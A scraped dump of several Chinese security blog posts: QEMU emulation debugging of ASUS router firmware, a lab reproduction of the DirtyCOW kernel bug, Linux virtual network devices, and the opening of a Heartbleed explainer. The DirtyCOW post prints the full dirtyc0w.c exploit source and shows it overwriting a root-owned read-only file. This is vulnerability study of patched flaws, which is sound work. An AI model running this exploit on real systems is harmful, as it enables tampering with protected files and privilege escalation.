(do_work_pending+0x54/0xac) [ 9.770408] [\u0026lt;c00198d8\u0026gt;] (do_work_pending) from [\u0026lt;c0016c8c\u0026gt;] (work_pending+0xc/0x20) Illegal instruction (core dumped) 当然，用到了openssl的各个组件，如httpd，也是由此无法正常工作的。\n动态调试看看。在qemu-system-arm环境中启动gdbserver：（gdbserver可以来这里获取：https://github.com/dev2ero/embins）\n1 gdbserver :1234 /usr/sbin/openssl 在宿主机使用gdb-multiarch作为gdb client调试：\n1 2 3 4 5 6 7 8 ~$ gdb-multiarch pwndbg\u0026gt; set architecture armv7 The target architecture is set to \u0026#34;armv7\u0026#34;. pwndbg\u0026gt; target remote 192.168.50.1:1234 Remote debugging using 192.168.50.1:1234 pwndbg\u0026gt; file asuswrt/usr/sbin/openssl Reading symbols from asuswrt/usr/sbin/openssl... pwndbg\u0026gt; c 触发SIGILL：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Program received signal SIGILL, Illegal instruction. 0xb6d871a8 in BIO_new () from target:/usr/lib/libcrypto.so.1.1 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ───────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────── *R0 0xaf020 —▸ 0xb6f4badc ◂— 0x402 R1 0x0 *R2 0x1 *R3 0xaf050 ◂— 0x0 *R4 0xaf020 —▸ 0xb6f4badc ◂— 0x402 *R5 0xb6f4badc ◂— 0x402 *R6 0xb6ffece0 (__stack_chk_guard) ◂— 0x10072e00 *R7 0xa5848 —▸ 0xa5738 ◂— 0x1 R8 0x0 *R9 0xbefffdb4 —▸ 0xbefffea8 ◂— \u0026#39;/usr/sbin/openssl\u0026#39; *R10 0x1 R11 0x0 R12 0x0 *SP 0xbefff7b8 —▸ 0xb6ff9648 —▸ 0x1e6a9 ◂— cdpmi p0, #4, c5, c5, c15, #2 /* \u0026#39;OPENSSL_1_1_0\u0026#39; */ *PC 0xb6d871a8 (BIO_new+84) ◂— 0xe183fc92 ─────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────── Invalid instructions at 0xb6d871a8 看来是libcrypto.so.1.1中的BIO_new()函数包含了非法指令。反汇编看看是哪条指令出了问题：\n1 2 3 4 5 6 7 pwndbg\u0026gt; disassemble BIO_new Dump of assembler code for function BIO_new: ...... 0xb6d871a4 \u0026lt;+80\u0026gt;: add r3, r4, #48 ; 0x30 =\u0026gt; 0xb6d871a8 \u0026lt;+84\u0026gt;: stl r2, [r3] 0xb6d871ac \u0026lt;+88\u0026gt;: add r7, r4, #72 ; 0x48 ...... stl指令是非法指令？为什么呢？Google一下得到：\nhttps://developer.arm.com/documentation/100076/0200/a32-t32-instruction-set-reference/a32-and-t32-instructions/stl?lang=en\n其中注明了：\nThis 32-bit instruction is available in A32 and T32.\nThere is no 16-bit version of this instruction.\nstl指令只是A32和T32处理器核下可用，那么这两个处理器核对应的指令集架构是什么呢？继续Google：\nhttps://developer.arm.com/Processors/Cortex-A32\n得到：\nArchitecture: 32-bit Armv8-A\n这是一条Armv8的指令。那我们此时的qemu-system-arm用的是什么环境呢？\n1 2 3 4 5 6 7 qemu-system-arm -M help ...... virt-6.1 QEMU 6.1 ARM Virtual Machine virt-6.2 QEMU 6.2 ARM Virtual Machine virt QEMU 7.0 ARM Virtual Machine (alias of virt-7.0) virt-7.0 QEMU 7.0 ARM Virtual Machine ...... machine的说明中只说明了我所用的virt是指QEMU 7.0 ARM Virtual Machine，并未介绍更多信息\n那么去虚拟环境中直接看看：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 admin@(none):/# cat /proc/cpuinfo processor : 0 model name : ARMv7 Processor rev 1 (v7l) BogoMIPS : 125.00 Features : half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm CPU implementer : 0x41 CPU architecture: 7 CPU variant : 0x2 CPU part : 0xc0f CPU revision : 1 Hardware : Generic DT based system Revision : 0000 Serial : 0000000000000000 问题原因找到了，此时我们虚拟环境的CPU所用指令集为Armv7，并未包含Armv8下的stl指令。\n做个实验验证下猜想：\n准备一份arm下的hello world源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .section .data hello: .ascii \u0026#34;hello world\\n\u0026#34; .equ len, . - hello .section .text .global _start _start: mov r0, #1 ldr r1, =hello mov r2, #len mov r7, #4 swi #0 exit: mov r0, #0 mov r7, #1 swi #0 使用旧版arm-linux-gnueabi-gcc，可以正常汇编链接运行：\n1 2 3 4 ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-as hello.s -o hello.o ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-ld hello.o -o hello.out ~$ qemu-arm hello.out hello world 而为其添加上一行stl指令后则汇编失败：\n1 2 3 ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-as hello.s -o hello.o hello.s: Assembler messages: hello.s:11: Error: bad instruction `stl r0,[r1]\u0026#39; 由此验证了上面的原因推断。\n继续来看看固件中的ELF指令集版本：\n首先我们刚刚的hello.out是Armv4：\n1 2 3 4 5 6 ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-readelf -A hello.out Attribute Section: aeabi File Attributes Tag_CPU_arch: v4 Tag_ARM_ISA_use: Yes Tag_DIV_use: Not allowed 固件中的busybox、openssl，和出问题的libcrypto.so.1.1则是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-readelf -A asuswrt/busybox Attribute Section: aeabi File Attributes Tag_CPU_name: \u0026#34;Cortex-A9\u0026#34; Tag_CPU_arch: v7 Tag_CPU_arch_profile: Application Tag_ARM_ISA_use: Yes Tag_THUMB_ISA_use: Thumb-2 Tag_ABI_PCS_wchar_t: 4 Tag_ABI_FP_rounding: Needed Tag_ABI_FP_denormal: Needed Tag_ABI_FP_exceptions: Needed Tag_ABI_FP_number_model: IEEE 754 Tag_ABI_align_needed: 8-byte Tag_ABI_align_preserved: 8-byte, except leaf SP Tag_ABI_enum_size: int Tag_CPU_unaligned_access: v6 Tag_MPextension_use: Allowed Tag_Virtualization_use: TrustZone ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-readelf -A ../usr/sbin/openssl Attribute Section: aeabi File Attributes Tag_CPU_name: \u0026#34;8-A\u0026#34; Tag_CPU_arch: ??? (14) Tag_CPU_arch_profile: Application Tag_ARM_ISA_use: Yes Tag_THUMB_ISA_use: Thumb-2 Tag_ABI_PCS_wchar_t: 4 Tag_ABI_FP_rounding: Needed Tag_ABI_FP_denormal: Needed Tag_ABI_FP_exceptions: Needed Tag_ABI_FP_number_model: IEEE 754 Tag_ABI_align_needed: 8-byte Tag_ABI_align_preserved: 8-byte, except leaf SP Tag_ABI_enum_size: int Tag_CPU_unaligned_access: v6 Tag_MPextension_use: Allowed Tag_Virtualization_use: TrustZone and Virtualization Extensions ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-readelf -A asuswrt/usr/lib/libcrypto.so.1.1 Attribute Section: aeabi File Attributes Tag_CPU_name: \u0026#34;8-A\u0026#34; Tag_CPU_arch: ??? (14) Tag_CPU_arch_profile: Application Tag_ARM_ISA_use: Yes Tag_THUMB_ISA_use: Thumb-2 Tag_FP_arch: VFPv3 Tag_Advanced_SIMD_arch: NEONv1 Tag_ABI_PCS_wchar_t: 4 Tag_ABI_FP_rounding: Needed Tag_ABI_FP_denormal: Needed Tag_ABI_FP_exceptions: Needed Tag_ABI_FP_number_model: IEEE 754 Tag_ABI_align_needed: 8-byte Tag_ABI_enum_size: int Tag_CPU_unaligned_access: v6 Tag_MPextension_use: Allowed Tag_Virtualization_use: TrustZone and Virtualization Extensions 一个固件中的不同组件还用了不同的编译工具链？！\nbusybox是Armv7，而openssl和libcrypto.so.1.1则是Armv8-A。\n这也解释了为什么我在仿真旧版本固件时是没有该故障存在的。旧版本固件中的是Armv7的libcrypto.so.1.0.0。\n我们来到固件的下载页面：https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AC86U/HelpDesk_BIOS/\n可以看到新版本固件中华硕对于OpenSSL的漏洞进行了修复：\n版本 3.0.0.4.386.48260\n2022/03/25 62.81 MBytes\nASUS RT-AC86U 固件版本 3.0.0.4.386.48260\n修正 OpenSSL CVE-2022-0778 ​ \u0026hellip;\u0026hellip;\n原来他们修复时并没有将固件全量编译，而是只换用了新编译工具链将出问题的openssl重新编译了。\n恰好我手头有华硕的路由器真机，来看看真机环境是什么：\n1 2 zkv@RT-AC86U:/tmp/home/root# uname -a Linux RT-AC86U 4.1.27 #2 SMP PREEMPT Thu Nov 11 17:12:59 CST 2021 aarch64 好家伙，直接是aarch64的linux内核。至于CPU，型号是Boardcom BCM4906：https://www.broadcom.com/products/wireless/wireless-lan-infrastructure/bcm49408\n原来是Armv8-A的A53：https://developer.arm.com/Processors/Cortex-A53\n其中注明了：\nISA Support\nAArch32 for full backward compatibility with Armv7 AArch64 for 64-bit support and new architectural features \u0026hellip;\u0026hellip; 由此破案了：华硕为这台路由器用了较新的A53 64位CPU和64位内核，内部软件却都是较旧的Armv7指令集下的32位软件。整台机器相当于是跑在一个“向下兼容模式”。\n——直到他们修复OpenSSL CVE-2022-0778时，固件中才首次出现了Armv8的软件OpenSSL。（当然配套依赖也引入了，如ld-linux-aarch64.so.1）\n👮收网 qemu难道就不包含Armv8了吗？\n使用qemu-user试试：\n1 2 ~$ chroot asuswrt openssl OpenSSL\u0026gt; 是可以正常执行的。说明qemu是有写过Armv8的代码的。\n这里要说明下为什么可以直接使用chroot guest_rootfs_dir target_elf的形式直接执行其它指令集的ELF。\n我们都知道的是，Linux下的可执行文件，是一个广义词。文件系统中inode标记了x位，即可执行位的文件，都算作可执行文件。\n那么，.sh、.py、ELF等等，都算是可执行文件了。但他们的执行方式却又多种多样，这又是怎么区分的呢？\n实际上是借助于不同可执行文件的文件头，来调用不同的“解释器”，完成对于可执行文件的不同方式执行：\nELF，二进制文件，有狭义文件头，魔数为\\x7fELF，“解释器”为ld.so，即标明：“本可执行文件请交由ld.so来执行”\n.sh，文本文件，无狭义文件头，#!/bin/sh作为文件起始内容，即标明：“本可执行文件请交由/bin/sh来执行”，参见：http://en.wikipedia.org/wiki/Shebang_(Unix)\n没有显式注明解释器的可执行文件默认当作sh脚本文件处理：\n1 2 3 4 ~$ echo deadbeef \u0026gt; test ~$ chmod +x test ~$ ./test ./test: 1: deadbeef: not found https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html\n那同样的道理，在一台安装了qemu-user的机器上，直接./执行一个其它指令集的可执行文件时。由于qemu-user已经将这种文件的文件头信息在系统中注册了，即表明：“遇到这些其它指令集对应的文件头的文件时，请交由我qemu-user来解释执行。”\n那么，静态链接的异构程序，在安装了qemu-user的系统中，就可以直接./执行了。而动态链接的异构程序，由于需要载入其它异构的链接库文件，故需要先chroot到异构的根文件系统中。\nqemu-system-arm是32位时代的arm实现（aarch32），从Armv7到Armv8的升级，才引入了64位支持（aarch64）。所以我们应该换用qemu-system-aarch64：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 ~$ qemu-system-arm -cpu help Available CPUs: arm1026 arm1136 arm1136-r2 arm1176 arm11mpcore arm926 arm946 cortex-a15 cortex-a7 cortex-a8 cortex-a9 cortex-m0 cortex-m3 cortex-m33 cortex-m4 cortex-m55 cortex-m7 cortex-r5 cortex-r5f max pxa250 pxa255 pxa260 pxa261 pxa262 pxa270-a0 pxa270-a1 pxa270 pxa270-b0 pxa270-b1 pxa270-c0 pxa270-c5 sa1100 sa1110 ti925t ~$ qemu-system-aarch64 -cpu help Available CPUs: a64fx arm1026 arm1136 arm1136-r2 arm1176 arm11mpcore arm926 arm946 cortex-a15 cortex-a53 cortex-a57 cortex-a7 cortex-a72 cortex-a8 cortex-a9 cortex-m0 cortex-m3 cortex-m33 cortex-m4 cortex-m55 cortex-m7 cortex-r5 cortex-r5f max pxa250 pxa255 pxa260 pxa261 pxa262 pxa270-a0 pxa270-a1 pxa270 pxa270-b0 pxa270-b1 pxa270-c0 pxa270-c5 sa1100 sa1110 ti925t 同时手动指定CPU为cortex-a53：\n1 2 3 4 5 6 7 8 qemu-system-aarch64 -M virt -cpu cortex-a53 \\ -m 256 -kernel zImage.aarch64 \\ -append \u0026#34;rootwait root=/dev/vda1 console=ttyAMA0\u0026#34; \\ -drive if=none,file=rootfs.img,format=raw,id=rootfs \\ -device virtio-blk-device,drive=rootfs \\ -netdev type=tap,id=net0,ifname=tap0,script=no,downscript=no -device virtio-net-device,netdev=net0 \\ -nographic ","date":"2022-05-26T15:51:22+08:00","image":"https://s2.loli.net/2022/05/26/RS1JrGW2t4vzD3M.jpg","permalink":"https://cerr.cc/post/%E8%AE%B0%E4%B8%80%E6%AC%A1qemu-system-arm%E4%BB%BF%E7%9C%9F%E7%9A%84%E6%8E%92%E9%94%99/","title":"记一次qemu-system-arm仿真的排错"},{"content":"背景知识 DirtyCOW https://dirtycow.ninja/ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails Copy on Write https://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html https://blog.csdn.net/puliao4167/article/details/87894191 Page Cache https://en.wikipedia.org/wiki/Page_cache mmap https://www.cnblogs.com/huxiao-tee/p/4660352.html 内核文件系统 https://www.cnblogs.com/huxiao-tee/p/4657851.html 条件竞争 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/ 环境准备 Linux Kernel 直接下载 选取一个有漏洞的版本4.4.0，下载ubuntu对应的deb包。解压得到./boot/vmlinuz-4.4.0-31-generic\n1 2 3 wget http://security.ubuntu.com/ubuntu/pool/main/l/linux/linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb ar xv linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb tar jxvf data.tar.bz2 缺点是由此得到的bootable kernel中不包含调试信息。\n自行编译 获取Linux Kernel源码仓库并切换到一个有漏洞的版本4.4：\n1 2 3 git clone https://mirrors.tuna.tsinghua.edu.cn/git/linux.git cd linux git checkout v4.4 载入x86_64的默认配置：\n1 make x86_64_defconfig 使用Linux提供的脚本一键启用DEBUG_KERNEL、DEBUG_INFO、KGDB、GDB_SCRIPTS，关闭RANDOMIZE_BASE（kaslr）\n1 ./scripts/config --file .config -e DEBUG_KERNEL -e DEBUG_INFO -e GDB_SCRIPTS -e KGDB -d RANDOMIZE_BASE 由于是旧版kernel，需在老环境中编译。采用docker创建ubuntu16.04的编译环境：\n1 sudo docker run -it --rm -v /home/zkv/Laboratory/dirtycow/linux:/linux ubuntu:16.04 /bin/bash 于该container中准备编译环境并编译：\n1 2 3 4 5 6 7 8 9 10 11 apt update; apt install -y apt-transport-https cat \u0026gt; /etc/apt/sources.list \u0026lt;\u0026lt; EOF deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse EOF apt update; apt upgrade -y apt install gcc make bc cd /linux make -j`nproc` 即得到bootable kernel。\nPoC 从https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs选取dirtyc0w.c：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void *map; int f; struct stat st; char *name; void *madviseThread(void *arg) { char *str; str=(char*)arg; int i,c=0; for(i=0;i\u0026lt;100000000;i++) { /* You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661 \u0026gt; This is achieved by racing the madvise(MADV_DONTNEED) system call \u0026gt; while having the page of the executable mmapped in memory. */ c+=madvise(map,100,MADV_DONTNEED); } printf(\u0026#34;madvise %d\\n\\n\u0026#34;,c); } void *procselfmemThread(void *arg) { char *str; str=(char*)arg; /* You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16 \u0026gt; The in the wild exploit we are aware of doesn\u0026#39;t work on Red Hat \u0026gt; Enterprise Linux 5 and 6 out of the box because on one side of \u0026gt; the race it writes to /proc/self/mem, but /proc/self/mem is not \u0026gt; writable on Red Hat Enterprise Linux 5 and 6. */ int f=open(\u0026#34;/proc/self/mem\u0026#34;,O_RDWR); int i,c=0; for(i=0;i\u0026lt;100000000;i++) { /* You have to reset the file pointer to the memory position. */ lseek(f,(uintptr_t) map,SEEK_SET); c+=write(f,str,strlen(str)); } printf(\u0026#34;procselfmem %d\\n\\n\u0026#34;, c); } int main(int argc,char *argv[]) { /* You have to pass two arguments. File and Contents. */ if (argc\u0026lt;3) { (void)fprintf(stderr, \u0026#34;%s\\n\u0026#34;, \u0026#34;usage: dirtyc0w target_file new_content\u0026#34;); return 1; } pthread_t pth1,pth2; /* You have to open the file in read only mode. */ f=open(argv[1],O_RDONLY); fstat(f,\u0026amp;st); name=argv[1]; /* You have to use MAP_PRIVATE for copy-on-write mapping. \u0026gt; Create a private copy-on-write mapping. Updates to the \u0026gt; mapping are not visible to other processes mapping the same \u0026gt; file, and are not carried through to the underlying file. It \u0026gt; is unspecified whether changes made to the file after the \u0026gt; mmap() call are visible in the mapped region. */ /* You have to open with PROT_READ. */ map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0); printf(\u0026#34;mmap %zx\\n\\n\u0026#34;,(uintptr_t) map); /* You have to do it on two threads. */ pthread_create(\u0026amp;pth1,NULL,madviseThread,argv[1]); pthread_create(\u0026amp;pth2,NULL,procselfmemThread,argv[2]); /* You have to wait for the threads to finish. */ pthread_join(pth1,NULL); pthread_join(pth2,NULL); return 0; } 编译PoC：\n1 gcc -static -pthread dirtyc0w.c -o dirtyc0w rootfs 这里采用busybox手动构建。克隆busybox源码仓库，进行menuconfig配置：\n1 2 3 git clone https://git.busybox.net/busybox/ cd busybox make menuconfig Setttings 选中 Build static binary (no shared libs)，进行成静态链接构建。\n此后使用make install，生成_install目录，内含可被当作根文件树使用的安装文件。\n接下来我们来定制稍后的rootfs。先来到_install创建必要的目录和文件：\n1 2 3 4 5 6 cd _install mkdir -p proc sys dev etc/init.d mkdir home root echo \u0026#34;root::0:0:root:/root:/bin/sh\u0026#34; \u0026gt; etc/passwd # 此处将root:x:0:0:root:/root:/bin/sh中的x删除即可无密码登陆root echo \u0026#34;root:x:0:\u0026#34; \u0026gt; etc/group 编写init脚本：\n1 2 3 4 5 6 7 8 9 10 11 cat \u0026gt; ./init \u0026lt;\u0026lt; EOF #!/bin/sh mkdir /tmp mount -t proc none /proc mount -t sysfs none /sys mount -t devtmpfs none /dev mount -t debugfs none /sys/kernel/debug mount -t tmpfs none /tmp setsid /bin/cttyhack setuidgid 1000 /bin/sh EOF chmod +x ./init 由于类似tar、cpio的归档程序会将文件的inode一同打包，故host文件系统中的文件所属、权限等信息也会呈现在qemu guest中。所以这里我们需先为busybox进行必要的权限调整：\n1 2 sudo chown root:root busybox/_install/bin/busybox sudo chmod u+s busybox/_install/bin/busybox 将PoC加入后，打包cpio格式的initramfs：\n1 2 3 4 5 cp dirtyc0w busybox/_install/bin cd busybox/_install find . | cpio -o --format=newc \u0026gt; ../../rootfs.img # 解包命令 # cpio -idmv \u0026lt; rootfs.img rootfs即准备完毕。\n漏洞复现 上一步已经得到了：\n带调试信息的Linux Kernel：bzImage 包含了PoC的文件系统initramfs镜像：rootfs.img 我们使用qemu将其启动：\n1 2 3 4 5 qemu-system-x86_64 \\ -kernel bzImage \\ -initrd rootfs.img \\ -append \u0026#34;console=ttyS0\u0026#34; \\ -nographic 进入qemu guest后：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ~ $ id uid=1000 gid=1000 groups=1000 ~ $ ls -l /bin/dirtyc0w -rwxrwxr-x 1 1000 1000 1023952 Aug 18 08:00 /bin/dirtyc0w ~ $ su / # echo nothing \u0026gt; foo / # chmod 0404 foo / # ls -lah foo -r-----r-- 1 root root 16 Aug 18 08:48 foo / # ^D ~ $ cat foo nothing ~ $ dirtyc0w foo hacked!!! mmap 7fd5597c8000 ^C ~ $ cat foo hacked!!! 至此漏洞成功复现！🥳\n漏洞分析 Waiting\nhttps://xz.aliyun.com/t/7561\n","date":"2022-05-24T17:43:25+08:00","image":"https://s2.loli.net/2022/05/24/JFAS5mGpYn9utWi.jpg","permalink":"https://cerr.cc/post/cve-2016-5195-linux-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE-2016-5195 Linux DirtyCOW漏洞分析"},{"content":"ip与ifconfig命令输出 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ~$ ip a eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 00:0c:29:02:e4:a7 brd ff:ff:ff:ff:ff:ff inet 192.168.188.129/24 brd 192.168.188.255 scope global dynamic noprefixroute eth0 valid_lft 1126sec preferred_lft 1126sec inet6 fe80::20c:29ff:fe02:e4a7/64 scope link noprefixroute valid_lft forever preferred_lft forever ~$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.188.129 netmask 255.255.255.0 broadcast 192.168.188.255 inet6 fe80::20c:29ff:fe02:e4a7 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:0c:29:02:e4:a7 txqueuelen 1000 (Ethernet) RX packets 959 bytes 62153 (60.6 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 66 bytes 7598 (7.4 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 网卡的工作模式 广播模式（Broad Cast Model）：它的物理地址（MAC）地址是 0xffffff 的帧为广播帧，工作在广播模式的网卡接收广播帧； 多播传送（MultiCast Model）：多播传送地址作为目的物理地址的帧可以被组内的其它主机同时接收，而组外主机却接收不到。但是，如果将网卡设置为多播传送模式，它可以接收所有的多播传送帧，而不论它是不是组内成员； 直接模式（Direct Model）：工作在直接模式下的网卡只接收目地址是自己 Mac地址的帧； 混杂模式（Promiscuous Model）：工作在混杂模式下的网卡接收所有的流过网卡的帧，信包捕获程序就是在这种模式下运行的。 网卡的缺省工作模式包含广播模式和直接模式，即它只接收广播帧和发给自己的帧。如果采用混杂模式，一个站点的网卡将接受同一网络内所有站点所发送的数据包这样就可以到达对于网络信息监视捕获的目的。\nLinux下的虚拟网络设备 通过ip link add可以创建多种类型的虚拟网络设备，在man ip link中可以得知有以下类型的device:\nbridge - Ethernet Bridge device bond - Bonding device dummy - Dummy network interface hsr - High-availability Seamless Redundancy device ifb - Intermediate Functional Block device ipoib - IP over Infiniband device macvlan - Virtual interface base on link layer address (MAC) macvtap - Virtual interface based on link layer address (MAC) and TAP. vcan - Virtual Controller Area Network interface vxcan - Virtual Controller Area Network tunnel interface veth - Virtual ethernet interface vlan - 802.1q tagged virtual LAN interface vxlan - Virtual eXtended LAN ip6tnl - Virtual tunnel interface IPv4|IPv6 over IPv6 ipip - Virtual tunnel interface IPv4 over IPv4 sit - Virtual tunnel interface IPv6 over IPv4 gre - Virtual tunnel interface GRE over IPv4 gretap - Virtual L2 tunnel interface GRE over IPv4 erspan - Encapsulated Remote SPAN over GRE and IPv4 ip6gre - Virtual tunnel interface GRE over IPv6 ip6gretap - Virtual L2 tunnel interface GRE over IPv6 ip6erspan - Encapsulated Remote SPAN over GRE and IPv6 vti - Virtual tunnel interface nlmon - Netlink monitoring device ipvlan - Interface for L3 (IPv6/IPv4) based VLANs ipvtap - Interface for L3 (IPv6/IPv4) based VLANs and TAP lowpan - Interface for 6LoWPAN (IPv6) over IEEE 802.15.4 / Bluetooth geneve - GEneric NEtwork Virtualization Encapsulation bareudp - Bare UDP L3 encapsulation support amt - Automatic Multicast Tunneling (AMT) macsec - Interface for IEEE 802.1AE MAC Security (MACsec) vrf - Interface for L3 VRF domains netdevsim - Interface for netdev API tests rmnet - Qualcomm rmnet device xfrm - Virtual xfrm interface TUN/TAP TUN是Linux系统里的虚拟网络设备，它的原理和使用在Kernel Doc和Wiki做了比较清楚的说明。\nTUN设备模拟网络层设备(network layer)，处理三层报文，IP报文等，用于将报文注入到网络协议栈。\n应用程序(app)可以从物理网卡上读写报文，经过处理后通过TUN回送，或者从TUN读取报文处理后经物理网卡送出。\nTAP是Linux系统里的虚拟网络设备，它的原理和使用在Kernel Doc和Wiki做了比较清楚的说明。\n不同于TUN的是，TAP设备模拟链路层设备(link layer)，处理二层报文，以太网帧等。\nTAP设备与TUN设备的区别在于:\nTAP虚拟的是一个二层设备，具有MAC地址，接收、发送的是二层包。 TUN虚拟的是一个三层设备，没有MAC地址，接收、发送的是三层包。 最小的虚拟网卡 参见：\nhttps://zhou-yuxin.github.io/articles/2017/%E7%AC%AC%E4%B8%80%E4%B8%AALinux%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E2%80%94%E2%80%94%E6%9C%80%E7%AE%80%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1virnet/index.html\n","date":"2022-05-23T23:21:12+08:00","image":"https://s2.loli.net/2022/05/23/nEj1icSvZsA479q.jpg","permalink":"https://cerr.cc/post/%E5%85%B3%E4%BA%8Elinux%E4%B8%8B%E7%9A%84%E7%BD%91%E5%8D%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/","title":"关于Linux下的网卡与网络设备"},{"content":" 漏洞编号：CVE-2014-0160\n漏洞类型：内存越界访问\n漏洞危害：信息泄露\n影响范围：OpenSSL1.0.1、OpenSSL 1.0.1a~ OpenSSL 1.0.1f、OpenSSL 1.0.2-beta\n漏洞描述：OpenSSL 在实现 TLS（传输层安全协议）和 DTLS（数据报安全传输协议）的心跳包处理逻辑时存在问题。OpenSSL 的 Heartbleed 模块在处理心跳包时没有检查心跳包中的长度字段是否与后续的数据字段一致，攻击者利用该漏洞构造异常数据包，可获取服务器内存中多达 64KB 的数据。这些数据可能会包含证书私钥、用户账号、密码、邮件内容等敏感信息。\n背景知识 简介 传输层安全性协议SSL\nSSL 全称 Secure Sockets Layer（安全套接字层协议），要求建立在可靠的传输层协议（TCP）之上，主要提供机密性、认证性及数据完整性服务。SSL 最初（SSL 1.0、SSL2.0、SSL 3.0 版本）由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组（IETF）正式接管，并更名为 TLS（传输层安全协议，Transport Layer Security），发展至今已有 TLS 1.0、TLS1.1、TLS1.2 三个版本。\nSSL/TLS 协议能够提供的安全服务主要包括：\n认证性——使用数字证书认证服务器和客户端身份，防止身份伪造； 机密性——使用加密算法防止第三方窃听； 完整性——使用消息认证码（MAC）保障数据完整性，防止消息被篡改； 重放保护——通过使用隐式序列号防止重放攻击； SSL握手过程 客户端获取服务器的数字证书后，协商后续数据传输所使用的对称加密密钥。\nSSL Heartbeat Heartbleed was introduced by the Heartbeat Extension in the OpenSSL version 1.0.11 . This extension enables a low-cost, keepalive mechanism for peers to know that they’re still connected and all is well at the TLS layer. Standard implementations of TLS do not require the extension as they can rely on TCP for equivalent session management. Version 1.0.1 of OpenSSL added support for the Heartbeat functionality and enabled it by default.\n文档：Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS) Heartbeat Extension\nSSL 协议完成握手过程后，客户端和服务器间便建立安全可靠的通信。SSL 安全协议工作在传输层的 TCP 协议之上，所以服务器和客户端需要保持持续连接的状态。由于服务器的资源有限，当连接的客户端数量较大时，服务器要维持这些连接将会消耗很多资源，因此需要及时断开完成通信的客户端以减少服务器的负载压力。服务器通过 SSL 的心跳机制可判断客户端是否已完成通信。\nSSL 协议中的心跳机制工作于 SSL 记录协议之上，心跳机制中包含两种类型的消息：心跳请求消息（HeartbeatRequest Message）和心跳响应消息（HeartbeatResponse Message），这两种消息具有相同的包结构。当服务器和客户端完成 SSL 协议的握手阶段后，如果客户端一段时间没有与服务器进行数据交互，客户端需要周期性地向服务器发送心跳请求消息。服务器接收到客户端的心跳请求消息，则认为客户端还没有完成通信，继续维持客户端和服务器的连接，并向客户端发送心跳响应消息。\n通信双方在建立 SSL 连接时可协商是否支持心跳机制。在 SSL 